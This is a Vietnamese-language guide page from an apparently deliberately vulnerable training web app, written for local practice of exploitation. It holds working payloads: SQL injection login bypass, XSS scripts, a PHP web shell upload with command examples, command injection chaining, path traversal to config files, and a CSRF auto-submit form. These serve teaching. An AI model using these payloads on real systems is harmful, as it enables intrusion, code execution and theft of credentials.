<?php
session_start();
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hướng dẫn sử dụng - Vulnerable App</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1100px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            padding: 40px;
            animation: fadeIn 0.5s ease-in;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        h1 {
            font-size: 2.5em;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .vuln-section {
            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
            padding: 25px;
            margin-bottom: 25px;
            border-radius: 15px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }
        .vuln-section h2 {
            color: #667eea;
            margin-bottom: 15px;
            font-size: 1.5em;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .vuln-section h3 {
            color: #333;
            margin: 15px 0 10px 0;
            font-size: 1.2em;
        }
        .step {
            background: white;
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            border-left: 4px solid #667eea;
        }
        .step strong {
            color: #667eea;
            display: block;
            margin-bottom: 8px;
        }
        code {
            background: #1e1e1e;
            color: #00ff00;
            padding: 10px 15px;
            border-radius: 8px;
            display: block;
            margin: 10px 0;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            font-size: 0.9em;
        }
        .warning-box {
            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
            color: white;
            padding: 20px;
            border-radius: 12px;
            margin-bottom: 30px;
            box-shadow: 0 4px 15px rgba(245, 87, 108, 0.3);
        }
        .back-link {
            text-align: center;
            margin-top: 30px;
        }
        .back-link a {
            color: white;
            text-decoration: none;
            font-weight: 500;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 12px 24px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 10px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.3);
        }
        .back-link a:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4);
        }
        ul {
            margin-left: 20px;
            margin-top: 10px;
        }
        ul li {
            margin: 8px 0;
            line-height: 1.6;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1><i class="fas fa-book"></i> Hướng dẫn sử dụng các lỗ hổng</h1>
        
        <div class="warning-box">
            <strong><i class="fas fa-exclamation-triangle"></i> Lưu ý:</strong> Đây là hướng dẫn chi tiết cách khai thác từng lỗ hổng. 
            Chỉ sử dụng trong môi trường local để học tập!
        </div>

        <!-- SQL Injection -->
        <div class="vuln-section">
            <h2><i class="fas fa-database"></i> 1. SQL Injection (login.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Truy cập trang <code>login.php</code>
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Trong ô "Tên đăng nhập", nhập:
                <code>admin' OR '1'='1</code>
            </div>
            <div class="step">
                <strong>Bước 3:</strong> Trong ô "Mật khẩu", nhập bất kỳ gì (ví dụ: <code>123</code>)
            </div>
            <div class="step">
                <strong>Bước 4:</strong> Click "Đăng nhập"
            </div>
            <div class="step">
                <strong>Kết quả:</strong> Bạn sẽ đăng nhập thành công mà không cần mật khẩu đúng!
            </div>
            <h3>Giải thích:</h3>
            <p>Payload <code>admin' OR '1'='1</code> làm cho câu SQL trở thành: <code>SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='123'</code></p>
            <p>Vì <code>'1'='1'</code> luôn đúng, nên điều kiện OR sẽ luôn trả về true, bỏ qua việc kiểm tra mật khẩu.</p>
        </div>

        <!-- Stored XSS -->
        <div class="vuln-section">
            <h2><i class="fas fa-code"></i> 2. Stored XSS (comment.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Truy cập trang <code>comment.php</code>
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Trong ô "Viết comment", nhập:
                <code>&lt;script&gt;alert('XSS Attack!')&lt;/script&gt;</code>
            </div>
            <div class="step">
                <strong>Bước 3:</strong> Click "Gửi Comment"
            </div>
            <div class="step">
                <strong>Bước 4:</strong> Khi trang reload, bạn sẽ thấy popup alert xuất hiện!
            </div>
            <h3>Payload khác:</h3>
            <ul>
                <li><code>&lt;img src=x onerror=alert('XSS')&gt;</code></li>
                <li><code>&lt;svg onload=alert('XSS')&gt;</code></li>
            </ul>
        </div>

        <!-- Reflected XSS -->
        <div class="vuln-section">
            <h2><i class="fas fa-search"></i> 3. Reflected XSS (search.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Truy cập trang <code>search.php</code>
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Trong ô tìm kiếm, nhập:
                <code>&lt;script&gt;alert('Reflected XSS')&lt;/script&gt;</code>
            </div>
            <div class="step">
                <strong>Bước 3:</strong> Click "Tìm kiếm"
            </div>
            <div class="step">
                <strong>Kết quả:</strong> Popup alert sẽ xuất hiện ngay lập tức!
            </div>
            <h3>Hoặc dùng URL trực tiếp:</h3>
            <code>search.php?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
        </div>

        <!-- File Upload -->
        <div class="vuln-section">
            <h2><i class="fas fa-upload"></i> 4. File Upload (upload.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Tạo file <code>shell.php</code> với nội dung:
                <code>&lt;?php system($_GET['cmd']); ?&gt;</code>
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Truy cập trang <code>upload.php</code>
            </div>
            <div class="step">
                <strong>Bước 3:</strong> Chọn file <code>shell.php</code> và click "Upload File"
            </div>
            <div class="step">
                <strong>Bước 4:</strong> Sau khi upload thành công, truy cập:
                <code>http://localhost/vuln-site/uploads/shell.php?cmd=dir</code>
            </div>
            <div class="step">
                <strong>Kết quả:</strong> Bạn sẽ thấy danh sách file trong thư mục!
            </div>
            <h3>Thử các lệnh khác:</h3>
            <ul>
                <li><code>shell.php?cmd=whoami</code> - Xem user hiện tại</li>
                <li><code>shell.php?cmd=ipconfig</code> - Xem cấu hình mạng</li>
                <li><code>shell.php?cmd=type config.php</code> - Đọc file config
            </ul>
        </div>

        <!-- IDOR -->
        <div class="vuln-section">
            <h2><i class="fas fa-user-shield"></i> 5. IDOR (profile.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Truy cập <code>profile.php?user_id=1</code> (xem profile admin)
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Thay đổi URL thành <code>profile.php?user_id=2</code>
            </div>
            <div class="step">
                <strong>Kết quả:</strong> Bạn có thể xem thông tin của user khác, kể cả password!
            </div>
            <h3>Thử với các user_id khác:</h3>
            <ul>
                <li><code>profile.php?user_id=1</code> - Admin</li>
                <li><code>profile.php?user_id=2</code> - User1</li>
                <li><code>profile.php?user_id=3</code> - Test</li>
            </ul>
        </div>

        <!-- Command Injection -->
        <div class="vuln-section">
            <h2><i class="fas fa-terminal"></i> 6. Command Injection (ping.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Truy cập trang <code>ping.php</code>
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Trong ô "Nhập địa chỉ IP", nhập:
                <code>127.0.0.1 && dir</code>
            </div>
            <div class="step">
                <strong>Bước 3:</strong> Click "Ping"
            </div>
            <div class="step">
                <strong>Kết quả:</strong> Bạn sẽ thấy kết quả lệnh <code>dir</code> (danh sách file)!
            </div>
            <h3>Các lệnh khác để thử (Windows):</h3>
            <ul>
                <li><code>127.0.0.1 && whoami</code> - Xem user hiện tại</li>
                <li><code>127.0.0.1 && ipconfig</code> - Xem cấu hình mạng</li>
                <li><code>127.0.0.1 && type config.php</code> - Đọc file config</li>
                <li><code>127.0.0.1 && echo %USERNAME%</code> - Xem username</li>
            </ul>
        </div>

        <!-- Path Traversal -->
        <div class="vuln-section">
            <h2><i class="fas fa-folder-open"></i> 7. Path Traversal (file_viewer.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Truy cập trang <code>file_viewer.php</code>
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Trong ô "Đường dẫn file", nhập:
                <code>config.php</code>
            </div>
            <div class="step">
                <strong>Bước 3:</strong> Click "Xem file"
            </div>
            <div class="step">
                <strong>Kết quả:</strong> Bạn sẽ thấy nội dung file config với thông tin database!
            </div>
            <h3>Thử đọc các file khác:</h3>
            <ul>
                <li><code>../config.php</code> - File config (dùng .. để lùi thư mục)</li>
                <li><code>../../init_db.sql</code> - File SQL</li>
                <li><code>..\..\..\Windows\System32\drivers\etc\hosts</code> - File hosts (Windows)</li>
            </ul>
        </div>

        <!-- CSRF -->
        <div class="vuln-section">
            <h2><i class="fas fa-exchange-alt"></i> 8. CSRF (change_password.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Tạo file <code>csrf_attack.html</code> với nội dung:
                <code>&lt;form action="http://localhost/vuln-site/change_password.php" method="POST"&gt;
  &lt;input type="hidden" name="user_id" value="1"&gt;
  &lt;input type="hidden" name="new_password" value="hacked123"&gt;
  &lt;input type="submit" value="Click để nhận quà miễn phí!"&gt;
&lt;/form&gt;
&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</code>
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Mở file HTML này trong trình duyệt (hoặc gửi link cho admin)
            </div>
            <div class="step">
                <strong>Bước 3:</strong> Nếu admin đang đăng nhập và click vào, mật khẩu sẽ bị đổi!
            </div>
            <h3>Giải thích:</h3>
            <p>CSRF cho phép tấn công thực hiện hành động thay mặt người dùng đã đăng nhập mà họ không biết.</p>
        </div>

        <!-- Information Disclosure -->
        <div class="vuln-section">
            <h2><i class="fas fa-info-circle"></i> 9. Information Disclosure (error_demo.php)</h2>
            <div class="step">
                <strong>Bước 1:</strong> Truy cập <code>error_demo.php</code>
            </div>
            <div class="step">
                <strong>Bước 2:</strong> Click vào "Database Error - Lộ thông tin kết nối DB"
            </div>
            <div class="step">
                <strong>Kết quả:</strong> Bạn sẽ thấy thông tin database bị lộ (database name, server version, etc.)
            </div>
            <h3>Các demo khác:</h3>
            <ul>
                <li>Click "File Error" - Xem thông tin PHP version, server, đường dẫn</li>
                <li>Click "PHP Info" - Xem TOÀN BỘ cấu hình PHP (rất nhiều thông tin!)</li>
            </ul>
        </div>

        <!-- Weak Password -->
        <div class="vuln-section">
            <h2><i class="fas fa-key"></i> 10. Weak Password</h2>
            <div class="step">
                <strong>Thông tin tài khoản mặc định:</strong>
                <ul>
                    <li>Username: <code>admin</code></li>
                    <li>Password: <code>123456</code></li>
                </ul>
            </div>
            <h3>Vấn đề:</h3>
            <ul>
                <li>Mật khẩu quá yếu, dễ đoán</li>
                <li>Không có giới hạn số lần đăng nhập sai (có thể brute force)</li>
                <li>Mật khẩu được lưu plain text (không hash) - có thể thấy trong profile.php</li>
            </ul>
        </div>

        <div class="back-link">
            <a href="index.php"><i class="fas fa-arrow-left"></i> Về trang chủ</a>
        </div>
    </div>
</body>
</html>



